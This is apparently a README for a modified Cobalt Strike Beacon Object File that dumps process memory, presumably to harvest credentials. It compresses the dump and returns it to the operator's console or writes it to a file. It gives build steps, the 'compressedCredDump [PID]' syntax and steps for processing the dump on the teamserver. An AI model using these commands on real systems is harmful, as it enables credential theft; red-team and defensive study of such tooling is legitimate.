# compressedCredBandit

compressedCredBandit is a modified version of [anthemtotheego's](https://github.com/anthemtotheego) proof of concept Beacon Object File (BOF). This version does all that the original did with the addition of compressing the data to reduce the size of the dump that must be transfered.

See the original project for additional details:
- [https://github.com/anthemtotheego/CredBandit](https://github.com/anthemtotheego/CredBandit)

## Building the project
```
cd src
make
```

## Syntax

Dump to cs console:
```
compressedCredDump [PID]
```

Dump to file on remote system:
```
compressedCredDump [PID] [PATH]
```

## Clean-Up

Use the cleanupMiniDump.sh Script to clean up the retrieved file, which should be in the root of your teamserver's directory.

1. Copy the dumpFile.txt file to a working directory.
2. Run the cleanupMiniDump.sh script and specify the path to the dump file.
```
cleanupMiniDump.sh [PATH]
```
{:start="3"}
3. Use the decompress Visual Studio project to decompress the dump file.
